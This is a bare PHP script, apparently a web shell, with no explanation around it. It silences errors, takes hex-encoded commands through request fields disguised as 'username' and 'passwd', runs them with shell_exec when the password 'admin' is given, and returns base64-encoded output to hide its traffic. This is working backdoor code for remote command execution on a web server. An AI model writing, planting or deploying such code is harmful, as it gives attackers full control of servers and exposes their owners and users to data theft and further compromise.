<?php
    @error_reporting(0);
    function hexToStr($hex){
        $str="";
        for($i=0;$i<strlen($hex)-1;$i+=2)
            $str.=chr(hexdec($hex[$i].$hex[$i+1]));
        return $str;
    }
    if(isset($_REQUEST['username']) and isset($_REQUEST['passwd'])){
        $username = hexToStr($_REQUEST['username']);
        $passwd = hexToStr($_REQUEST['passwd']);
        if ($passwd==="admin"){
            $output = shell_exec($username);
            $encode = base64_encode($output);
            echo $encode;
        }
        die;
    }
?>